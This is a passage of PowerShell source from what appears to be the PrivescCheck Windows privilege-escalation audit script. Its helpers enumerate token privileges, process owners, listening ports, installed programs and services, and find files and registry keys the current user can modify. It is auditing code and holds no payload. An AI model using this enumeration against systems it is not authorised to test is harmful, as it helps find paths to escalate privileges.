                            $PrivilegeObject | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $(Get-PrivilegeDescription -Name $PrivilegeName)
                            $PrivilegeObject

                        } else {
                            Write-Verbose ([ComponentModel.Win32Exception] $LastError)
                        }

                    } else {
                        Write-Verbose ([ComponentModel.Win32Exception] $LastError)
                    }

                    # Cleanup - Free unmanaged memory
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)

                    # Update the offset to point to the next LUID_AND_ATTRIBUTES structure in the unmanaged buffer
                    #$Offset = [System.IntPtr]::Add($Offset, [System.Runtime.InteropServices.Marshal]::SizeOf($LuidAndAttributes))
                    # Properly Incrementing an IntPtr
                    # https://docs.microsoft.com/en-us/archive/blogs/jaredpar/properly-incrementing-an-intptr
                    $Offset = [IntPTr] ($Offset.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf($LuidAndAttributes))
                }

            } else {
                Write-Verbose ([ComponentModel.Win32Exception] $LastError)
            }

            # Cleanup - Free unmanaged memory
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)

        } else {
            Write-Verbose ([ComponentModel.Win32Exception] $LastError)
        }

        # Cleanup - Close Token handle 
        $Success = [PrivescCheck.Win32]::CloseHandle($TokenHandle)
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        if ($Success) {
            Write-Verbose "Token handle closed"
        } else {
            Write-Verbose ([ComponentModel.Win32Exception] $LastError)
        }

    } else {
        Write-Verbose ([ComponentModel.Win32Exception] $LastError)
    }
}

function Get-UserFromProcess() {
    <#
    .SYNOPSIS

    Helper - Gets the user associated to a given process

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    First it gets a handle to the process identified by the given PID. Then, it uses this handle to
    access the process token. GetTokenInformation() is then used to query the SID of the user.
    Finally the SID is converted to a domain name, user name and SID type. All this information is
    returned in a custom PS object. 
    
    .PARAMETER ProcessId

    The PID of the target process
    
    .EXAMPLE

    PS C:\> Get-UserFromProcess -ProcessId 6972

    Domain          Username Type
    ------          -------- ----
    DESKTOP-FEOHNOM lab-user User
    
    #>
    
    [CmdletBinding()] param(
        [Parameter(Mandatory=$true)]
        [int]
        $ProcessId
    )

    function Get-SidTypeName {
        param(
            $SidType
        )

        $SidTypeEnum = @{
            "User" = "1";
            "Group" = "2";
            "Domain" = "3";
            "Alias" = "4";
            "WellKnownGroup" = "5";
            "DeletedAccount" = "6";
            "Invalid" = "7";
            "Unknown" = "8";
            "Computer" = "9";
            "Label" = "10";
            "LogonSession" = "11";
        }

        $SidTypeEnum.GetEnumerator() | ForEach-Object { 
            if ( $_.value -eq $SidType ) 
            {
                $_.name
            }
        }
    }

    # PROCESS_QUERY_INFORMATION = 0x0400
    $AccessFlags = 0x0400
    $ProcessHandle = [PrivescCheck.Win32]::OpenProcess($AccessFlags, $False, $ProcessId)
    #$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if (-not ($Null -eq $ProcessHandle)) {

        Write-Verbose "OpenProcess() OK - Handle: $ProcessHandle"

        $TOKEN_QUERY= 0x0008
        [IntPtr]$TokenHandle = [IntPtr]::Zero
        $Success = [PrivescCheck.Win32]::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$TokenHandle);
        #$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

        if ($Success) {

            Write-Verbose "OpenProcessToken() OK - Handle: $ProcessHandle"

            # TOKEN_INFORMATION_CLASS - 1 = TokenUser
            $TokenUserPtrSize = 0
            $Success = [PrivescCheck.Win32]::GetTokenInformation($TokenHandle, 1, 0, $Null, [ref]$TokenUserPtrSize)
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if (($TokenUserPtrSize -gt 0) -and ($LastError -eq 122)) {

                Write-Verbose "GetTokenInformation() OK - Size: $TokenUserPtrSize"

                [IntPtr]$TokenUserPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenUserPtrSize)

                $Success = [PrivescCheck.Win32]::GetTokenInformation($TokenHandle, 1, $TokenUserPtr, $TokenUserPtrSize, [ref]$TokenUserPtrSize)
                $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error() 

                if ($Success) {

                    Write-Verbose "GetTokenInformation() OK"

                    # Cast unmanaged memory to managed TOKEN_USER struct 
                    $TokenUser = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenUserPtr, [type] [PrivescCheck.Win32+TOKEN_USER])

                    $SidType = 0

                    $UserNameSize = 256
                    $UserName = New-Object -TypeName System.Text.StringBuilder
                    $UserName.EnsureCapacity(256) | Out-Null

                    $UserDomainSize = 256
                    $UserDomain = New-Object -TypeName System.Text.StringBuilder
                    $UserDomain.EnsureCapacity(256) | Out-Null

                    $Success = [PrivescCheck.Win32]::LookupAccountSid($Null, $TokenUser.User.Sid, $UserName, [ref]$UserNameSize, $UserDomain, [ref]$UserDomainSize, [ref]$SidType)
                    $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if ($Success) {

                        $UserObject = New-Object -TypeName PSObject 
                        $UserObject | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $UserDomain.ToString()
                        $UserObject | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $UserName.ToString()
                        $UserObject | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value "$($UserDomain.ToString())\$($UserName.ToString())"
                        $UserObject | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $(Get-SidTypeName $SidType)
                        $UserObject
                        
                    } else {
                        Write-Verbose "LookupAccountSid() failed."
                        Write-Verbose ([ComponentModel.Win32Exception] $LastError)
                    }
                } else {
                    Write-Verbose "GetTokenInformation() failed."
                    Write-Verbose ([ComponentModel.Win32Exception] $LastError)
                }

                # Cleanup - Free unmanaged memory 
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenUserPtr)
            }

            # Cleanup - Close token handle 
            $Success = [PrivescCheck.Win32]::CloseHandle($TokenHandle)
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success) {
                Write-Verbose "Token handle closed"
            } else {
                Write-Verbose ([ComponentModel.Win32Exception] $LastError)
            }
        } else {
            Write-Verbose "Can't open token for process with PID $ProcessId"
        }

        # Cleanup - Close process handle 
        $Success = [PrivescCheck.Win32]::CloseHandle($ProcessHandle)
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        if ($Success) {
            Write-Verbose "Process handle closed"
        } else {
            Write-Verbose ([ComponentModel.Win32Exception] $LastError)
        }
    } else {
        Write-Verbose "Can't open process with PID $ProcessId"
    }
}

function Get-NetworkEndpoints {
    <#
    .SYNOPSIS

    Helper - Gets a list of listening ports (TCP/UDP)

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    It uses the 'GetExtendedTcpTable' and 'GetExtendedUdpTable' functions of the Windows API to 
    list the TCP/UDP endpoints on the local machine. It handles both IPv4 and IPv6. For each 
    entry in the table, a custom PS object is returned, indicating the IP version (IPv4/IPv6),
    the protocol (TCP/UDP), the local address (e.g.: "0.0.0.0:445"), the state, the PID of the 
    associated process and the name of the process. The name of the process is retrieved through
    a call to "Get-Process -PID <PID>".
    
    .EXAMPLE

    PS C:\> Get-NetworkEndpoints | ft
    
    IP   Proto LocalAddress LocalPort Endpoint         State       PID Name
    --   ----- ------------ --------- --------         -----       --- ----
    IPv4 TCP   0.0.0.0            135 0.0.0.0:135      LISTENING  1216 svchost
    IPv4 TCP   0.0.0.0            445 0.0.0.0:445      LISTENING     4 System
    IPv4 TCP   0.0.0.0           5040 0.0.0.0:5040     LISTENING  8580 svchost
    IPv4 TCP   0.0.0.0          49664 0.0.0.0:49664    LISTENING   984 lsass
    IPv4 TCP   0.0.0.0          49665 0.0.0.0:49665    LISTENING   892 wininit
    IPv4 TCP   0.0.0.0          49666 0.0.0.0:49666    LISTENING  1852 svchost
    IPv4 TCP   0.0.0.0          49667 0.0.0.0:49667    LISTENING  1860 svchost
    IPv4 TCP   0.0.0.0          49668 0.0.0.0:49668    LISTENING  2972 svchost
    IPv4 TCP   0.0.0.0          49669 0.0.0.0:49669    LISTENING  4480 spoolsv
    IPv4 TCP   0.0.0.0          49670 0.0.0.0:49670    LISTENING   964 services
    
    .EXAMPLE

    PS C:\> Get-NetworkEndpoints -UDP -IPv6 | ft

    IP   Proto LocalAddress LocalPort Endpoint    State  PID Name       
    --   ----- ------------ --------- --------    -----  --- ----
    IPv6 UDP   ::                 500 [::]:500    N/A   5000 svchost
    IPv6 UDP   ::                3702 [::]:3702   N/A   4128 dasHost
    IPv6 UDP   ::                3702 [::]:3702   N/A   4128 dasHost
    IPv6 UDP   ::                4500 [::]:4500   N/A   5000 svchost
    IPv6 UDP   ::               62212 [::]:62212  N/A   4128 dasHost
    IPv6 UDP   ::1               1900 [::1]:1900  N/A   5860 svchost
    IPv6 UDP   ::1              63168 [::1]:63168 N/A   5860 svchost 
    #>

    [CmdletBinding()] param(
        [switch]
        $IPv6 = $False, # IPv4 by default 
        [switch]
        $UDP = $False # TCP by default 
    )

    $AF_INET6 = 23
    $AF_INET = 2
    
    if ($IPv6) { 
        $IpVersion = $AF_INET6
    } else {
        $IpVersion = $AF_INET
    }

    if ($UDP) {
        $UDP_TABLE_OWNER_PID = 1
        [int]$BufSize = 0
        $Result = [PrivescCheck.Win32]::GetExtendedUdpTable([IntPtr]::Zero, [ref]$BufSize, $True, $IpVersion, $UDP_TABLE_OWNER_PID, 0)
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    } else {
        $TCP_TABLE_OWNER_PID_LISTENER = 3
        [int]$BufSize = 0
        $Result = [PrivescCheck.Win32]::GetExtendedTcpTable([IntPtr]::Zero, [ref]$BufSize, $True, $IpVersion, $TCP_TABLE_OWNER_PID_LISTENER, 0)
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    }

    if ($Result -eq 122) {

        Write-Verbose "GetExtendedProtoTable() OK - Size: $BufSize"

        [IntPtr]$TablePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BufSize)

        if ($UDP) {
            $Result = [PrivescCheck.Win32]::GetExtendedUdpTable($TablePtr, [ref]$BufSize, $True, $IpVersion, $UDP_TABLE_OWNER_PID, 0)
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        } else {
            $Result = [PrivescCheck.Win32]::GetExtendedTcpTable($TablePtr, [ref]$BufSize, $True, $IpVersion, $TCP_TABLE_OWNER_PID_LISTENER, 0)
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        }

        if ($Result -eq 0) {

            if ($UDP) {
                if ($IpVersion -eq $AF_INET) { 
                    $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TablePtr, [type] [PrivescCheck.Win32+MIB_UDPTABLE_OWNER_PID])
                } elseif ($IpVersion -eq $AF_INET6) { 
                    $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TablePtr, [type] [PrivescCheck.Win32+MIB_UDP6TABLE_OWNER_PID])
                }
            } else {
                if ($IpVersion -eq $AF_INET) { 
                    $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TablePtr, [type] [PrivescCheck.Win32+MIB_TCPTABLE_OWNER_PID])
                } elseif ($IpVersion -eq $AF_INET6) { 
                    $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TablePtr, [type] [PrivescCheck.Win32+MIB_TCP6TABLE_OWNER_PID])
                }
            }
            
            $NumEntries = $Table.dwNumEntries

            Write-Verbose "GetExtendedProtoTable() OK - NumEntries: $NumEntries"

            $Offset = [IntPtr] ($TablePtr.ToInt64() + 4)

            For ($i = 0; $i -lt $NumEntries; $i++) {

                if ($UDP) {
                    if ($IpVersion -eq $AF_INET) {
                        $TableEntry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Offset, [type] [PrivescCheck.Win32+MIB_UDPROW_OWNER_PID])
                        $LocalAddr = (New-Object -TypeName System.Net.IPAddress($TableEntry.localAddr)).IPAddressToString
                    } elseif ($IpVersion -eq $AF_INET6) {
                        $TableEntry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Offset, [type] [PrivescCheck.Win32+MIB_UDP6ROW_OWNER_PID])
                        $LocalAddr = New-Object -TypeName System.Net.IPAddress($TableEntry.localAddr, $TableEntry.localScopeId)
                    }
                } else {
                    if ($IpVersion -eq $AF_INET) {
                        $TableEntry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Offset, [type] [PrivescCheck.Win32+MIB_TCPROW_OWNER_PID])
                        $LocalAddr = (New-Object -TypeName System.Net.IPAddress($TableEntry.localAddr)).IPAddressToString
                    } elseif ($IpVersion -eq $AF_INET6) {
                        $TableEntry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Offset, [type] [PrivescCheck.Win32+MIB_TCP6ROW_OWNER_PID])
                        $LocalAddr = New-Object -TypeName System.Net.IPAddress($TableEntry.localAddr, $TableEntry.localScopeId)
                    }
                }

                $LocalPort = $TableEntry.localPort[0] * 0x100 + $TableEntry.localPort[1]
                $ProcessId = $TableEntry.owningPid

                if ($IpVersion -eq $AF_INET) {
                    $LocalAddress = "$($LocalAddr):$($LocalPort)"
                } elseif ($IpVersion -eq $AF_INET6) {
                    $LocalAddress = "[$($LocalAddr)]:$($LocalPort)"
                }

                $ListenerObject = New-Object -TypeName PSObject 
                $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "IP" -Value $(if ($IpVersion -eq $AF_INET) { "IPv4" } else { "IPv6" } )
                $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "Proto" -Value $(if ($UDP) { "UDP" } else { "TCP" } )
                $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "LocalAddress" -Value $LocalAddr
                $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "LocalPort" -Value $LocalPort
                $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "Endpoint" -Value $LocalAddress
                $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "State" -Value $(if ($UDP) { "N/A" } else { "LISTENING" } )
                $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "PID" -Value $ProcessId
                $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "Name" -Value (Get-Process -PID $ProcessId).ProcessName
                $ListenerObject

                $Offset = [IntPTr] ($Offset.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf($TableEntry))
            }

        } else {
            Write-Verbose ([ComponentModel.Win32Exception] $LastError)
        }

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TablePtr)

    } else {
        Write-Verbose ([ComponentModel.Win32Exception] $LastError)
    }
}

function Get-InstalledPrograms {
    <#
    .SYNOPSIS

    Helper - Enumerates the installed applications 

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    This looks for applications installed in the common "Program Files" and "Program Files (x86)" 
    folders. It also enumerates installed applications thanks to the registry by looking for all
    the subkeys in "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall".

    .PARAMETER Filtered

    If True, only non-default applications are returned. Otherwise, all the applications are 
    returned. The filter is base on a list of known applications which are known to be installed
    by default (e.g.: "Windows Defender").
    
    .EXAMPLE

    PS C:\> Get-InstalledPrograms -Filtered

    Mode                LastWriteTime     Length Name
    ----                -------------     ------ ----
    d----        29/11/2019     10:51            Npcap
    d----        29/11/2019     10:51            Wireshark
    
    #>
    
    [CmdletBinding()] param(
        [switch]
        $Filtered = $False
    )

    $InstalledProgramsResult = New-Object System.Collections.ArrayList

    $InstalledPrograms = New-Object System.Collections.ArrayList

    $PathProgram32 = Join-Path -Path $env:SystemDrive -ChildPath "Program Files (x86)"
    $PathProgram64 = Join-Path -Path $env:SystemDrive -ChildPath "Program Files" 

    $Items = Get-ChildItem -Path $PathProgram32,$PathProgram64 -ErrorAction SilentlyContinue
    if ($Items) {
        [void]$InstalledPrograms.AddRange($Items)
    }
    
    $RegInstalledPrograms = Get-ChildItem -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" 
    $RegInstalledPrograms6432 = Get-ChildItem -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" -ErrorAction SilentlyContinue
    if ($RegInstalledPrograms6432) { $RegInstalledPrograms += $RegInstalledPrograms6432 }
    ForEach ($InstalledProgram in $RegInstalledPrograms) {
        $InstallLocation = [System.Environment]::ExpandEnvironmentVariables($InstalledProgram.GetValue("InstallLocation"))
        if ($InstallLocation) {
            if (Test-Path -Path $InstallLocation -ErrorAction SilentlyContinue) {
                if ($InstallLocation[$InstallLocation.Length - 1] -eq "\") {
                    $InstallLocation = $InstallLocation.SubString(0, $InstallLocation.Length - 1)
                }
                $FileObject = Get-Item -Path $InstallLocation -ErrorAction SilentlyContinue -ErrorVariable GetItemError 
                if ($GetItemError) {
                    continue 
                }
                if ($FileObject -is [System.IO.DirectoryInfo]) {
                    continue
                }
                [void]$InstalledPrograms.Add([object]$FileObject)
            }
        }
    }

    $PathListResult = New-Object System.Collections.ArrayList
    ForEach ($InstalledProgram in $InstalledPrograms) {
        if (-not ($PathListResult -contains $InstalledProgram.FullName)) {
            [void]$InstalledProgramsResult.Add($InstalledProgram)
            [void]$PathListResult.Add($InstalledProgram.FullName)
        }
    }

    if ($Filtered) {
        $InstalledProgramsResultFiltered = New-Object -TypeName System.Collections.ArrayList
        ForEach ($InstalledProgram in $InstalledProgramsResult) {
            if (-Not ($global:IgnoredPrograms -contains $InstalledProgram.Name)) {
                [void]$InstalledProgramsResultFiltered.Add($InstalledProgram)
            }
        }
        $InstalledProgramsResultFiltered
    } else {
        $InstalledProgramsResult
    }
}

function Get-ServiceList {
    <#
    .SYNOPSIS

    Helper - Enumerates services (based on the registry)

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    This uses the registry to enumerate the services by looking for the subkeys of 
    "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services". This allows any user to get information
    about all the services. So, even if non-privileged users can't access the details of a service
    through the Service Control Manager, they can do so simply by accessing the registry.
    
    .PARAMETER FilterLevel

    This parameter can be used to filter out the result returned by the function based on the 
    following criteria:
        FilterLevel = 0 - No filtering 
        FilterLevel = 1 - Exclude 'Services with empty ImagePath'
        FilterLevel = 2 - Exclude 'Services with empty ImagePath' + 'Drivers' 
        FilterLevel = 3 - Exclude 'Services with empty ImagePath' + 'Drivers' + 'Known services' 
    
    .EXAMPLE

    PS C:\> Get-ServiceList -FilterLevel 3

    Name         : VMTools
    DisplayName  : VMware Tools
    User         : LocalSystem
    ImagePath    : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
    StartMode    : Automatic
    Type         : Win32OwnProcess
    RegistryKey  : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VMTools
    RegistryPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VMTools
    
    .NOTES

    A service "Type" can be one of the following:
        KernelDriver = 1
        FileSystemDriver = 2
        Adapter = 4
        RecognizerDriver = 8
        Win32OwnProcess = 16
        Win32ShareProcess = 32 
        InteractiveProcess = 256

    #>
    
    [CmdletBinding()] param(
        [Parameter(Mandatory=$true)]
        [ValidateSet(0,1,2,3)]
        [int]
        $FilterLevel
    )

    $ServicesRegPath = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services" 
    $RegAllServices = Get-ChildItem -Path $ServicesRegPath

    ForEach ($RegService in $RegAllServices) {

        $Properties = Get-ItemProperty -Path $RegService.PSPath -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
        if ($GetItemPropertyError) {
            # If an error occurred, skip the current item 
            continue 
        } 

        $DisplayName = [System.Environment]::ExpandEnvironmentVariables($Properties.DisplayName)

        $ServiceItem = New-Object -TypeName PSObject 
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Properties.PSChildName
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value $DisplayName
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Properties.ObjectName 
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Properties.ImagePath 
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "StartMode" -Value $(Convert-ServiceStartModeToString -StartMode $Properties.Start)
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $(Convert-ServiceTypeToString -ServiceType $Properties.Type)
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RegistryKey" -Value $RegService.Name
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RegistryPath" -Value $RegService.PSPath 

        # FilterLevel = 0 - Add the service to the list and go to the next one 
        if ($FilterLevel -eq 0) {
            $ServiceItem
            continue 
        }

        if ($Properties.ImagePath -and (-not ($Properties.ImagePath.trim() -eq ''))) {
            # FilterLevel = 1 - Add the service to the list of its ImagePath is not empty
            if ($FilterLevel -le 1) {
                $ServiceItem
                continue 
            }

            if ($Properties.Type -gt 8) {
                # FilterLevel = 2 - Add the service to the list if it's not a driver 
                if ($FilterLevel -le 2) {
                    $ServiceItem
                    continue
                }

                if (-not (Test-IsKnownService -ServiceName $Properties.PSChildName)) {
                    # FilterLevel = 3 - Add the service if it's not a built-in Windows service 
                    if ($FilterLevel -le 3) {
                        $ServiceItem
                        continue
                    }
                }
            }
        } 
    }
}

function Get-ModifiablePath {
    <#
    .SYNOPSIS

    Parses a passed string containing multiple possible file/folder paths and returns
    the file paths where the current user has modification rights.

    Author: @harmj0y
    License: BSD 3-Clause

    .DESCRIPTION

    Takes a complex path specification of an initial file/folder path with possible
    configuration files, 'tokenizes' the string in a number of possible ways, and
    enumerates the ACLs for each path that currently exists on the system. Any path that
    the current user has modification rights on is returned in a custom object that contains
    the modifiable path, associated permission set, and the IdentityReference with the specified
    rights. The SID of the current user and any group he/she are a part of are used as the
    comparison set against the parsed path DACLs.

    @itm4n: I made some small changes to the original code in order to prevent false positives as
    much as possible. 

    .PARAMETER Path

    The string path to parse for modifiable files. Required

    .PARAMETER LiteralPaths

    Switch. Treat all paths as literal (i.e. don't do 'tokenization').

    .EXAMPLE

    PS C:\> '"C:\Temp\blah.exe" -f "C:\Temp\config.ini"' | Get-ModifiablePath

    Path                       Permissions                IdentityReference
    ----                       -----------                -----------------
    C:\Temp\blah.exe           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    C:\Temp\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...

    .EXAMPLE

    PS C:\> Get-ChildItem C:\Vuln\ -Recurse | Get-ModifiablePath

    Path                       Permissions                IdentityReference
    ----                       -----------                -----------------
    C:\Vuln\blah.bat           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    C:\Vuln\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    ...
    #>
    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Switch]
        $LiteralPaths
    )

    BEGIN {
        # # false positives ?
        # $Excludes = @("MsMpEng.exe", "NisSrv.exe")

        # from http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
        $AccessMask = @{
            [uint32]'0x80000000' = 'GenericRead'
            [uint32]'0x40000000' = 'GenericWrite'
            [uint32]'0x20000000' = 'GenericExecute'
            [uint32]'0x10000000' = 'GenericAll'
            [uint32]'0x02000000' = 'MaximumAllowed'
            [uint32]'0x01000000' = 'AccessSystemSecurity'
            [uint32]'0x00100000' = 'Synchronize'
            [uint32]'0x00080000' = 'WriteOwner'
            [uint32]'0x00040000' = 'WriteDAC'
            [uint32]'0x00020000' = 'ReadControl'
            [uint32]'0x00010000' = 'Delete'
            [uint32]'0x00000100' = 'WriteAttributes'
            [uint32]'0x00000080' = 'ReadAttributes'
            [uint32]'0x00000040' = 'DeleteChild'
            [uint32]'0x00000020' = 'Execute/Traverse'
            [uint32]'0x00000010' = 'WriteExtendedAttributes'
            [uint32]'0x00000008' = 'ReadExtendedAttributes'
            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
            [uint32]'0x00000002' = 'WriteData/AddFile'
            [uint32]'0x00000001' = 'ReadData/ListDirectory'
        }

        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value

        $TranslatedIdentityReferences = @{}
    }

    PROCESS {

        ForEach($TargetPath in $Path) {

            $CandidatePaths = @()

            # possible separator character combinations
            $SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")

            if($PSBoundParameters['LiteralPaths']) {

                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))

                if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                }
                else {
                    # if the path doesn't exist, check if the parent folder allows for modification
                    try {
                        $ParentPath = Split-Path $TempPath -Parent
                        if($ParentPath -and (Test-Path -Path $ParentPath -ErrorAction SilentlyContinue)) {
                            $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                        }
                    }
                    catch {
                        # because Split-Path doesn't handle -ErrorAction SilentlyContinue nicely
                    }
                }
            }
            else {
                ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
                    $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {

                        if(($SeparationCharacterSet -notmatch ' ')) {

                            $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()

                            # if the path is actually an option like '/svc', skip it 
                            # it will prevent a lot of false positives but it might also skip vulnerable paths in some particular cases 
                            # though, it's more common to see options like '/svc' than file paths like '/ProgramData/something' in Windows 
                            if ($TempPath -Like "/*") { continue }

                            if($TempPath -and ($TempPath -ne '')) {
                                if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                    # if the path exists, resolve it and add it to the candidate list
                                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                                }

                                else {
                                    # if the path doesn't exist, check if the parent folder allows for modification
                                    try {
                                        $ParentPath = (Split-Path -Path $TempPath -Parent).Trim()
                                        if($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath -ErrorAction SilentlyContinue)) {
                                            $CandidatePaths += Resolve-Path -Path $ParentPath | Select-Object -ExpandProperty Path
                                        }
                                    }
                                    catch {
                                        # trap because Split-Path doesn't handle -ErrorAction SilentlyContinue nicely
                                    }
                                }
                            }
                        }
                        else {
                            # if the separator contains a space
                            $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
                        }
                    }
                }
            }

            $CandidatePaths | Sort-Object -Unique | ForEach-Object {

                $CandidatePath = $_

                try {
                
                    Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {

                        $FileSystemRights = $_.FileSystemRights.value__

                        $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $accessMask[$_] }

                        # the set of permission types that allow for modification
                        $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent

                        if($Comparison) {
                            if ($_.IdentityReference -notmatch '^S-1-5.*' -and $_.IdentityReference -notmatch '^S-1-15-.*') {
                                if(-not ($TranslatedIdentityReferences[$_.IdentityReference])) {
                                    # translate the IdentityReference if it's a username and not a SID
                                    $IdentityUser = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
                                    $TranslatedIdentityReferences[$_.IdentityReference] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                                }
                                $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
                            }
                            else {
                                $IdentitySID = $_.IdentityReference
                            }

                            if($CurrentUserSids -contains $IdentitySID) {
                                New-Object -TypeName PSObject -Property @{
                                    ModifiablePath = $CandidatePath
                                    IdentityReference = $_.IdentityReference
                                    Permissions = $Permissions
                                }
                            }
                        }
                    }
                } catch {
                    # trap because Get-Acl doesn't handle -ErrorAction SilentlyContinue nicely
                }
            }
        }
    }
}

function Get-ModifiableRegistryPath {
    <#
    .SYNOPSIS

    Helper - Checks the permissions of a given registry key and returns the ones that the current 
    user can modify. It's based on the same technique as the one used by @harmj0y in 
    "Get-ModifiablePath".

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Any registry path that the current user has modification rights on is returned in a custom 
    object that contains the modifiable path, associated permission set, and the IdentityReference
    with the specified rights. The SID of the current user and any group he/she are a part of are 
    used as the comparison set against the parsed path DACLs.
    
    .PARAMETER Path

    A registry key path. Required
    
    .EXAMPLE

    Get-ModifiableRegistryPath -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VulnService"

    Name              : VulnService
    ImagePath         : C:\APPS\MyApp\service.exe
    User              : NT AUTHORITY\NetworkService
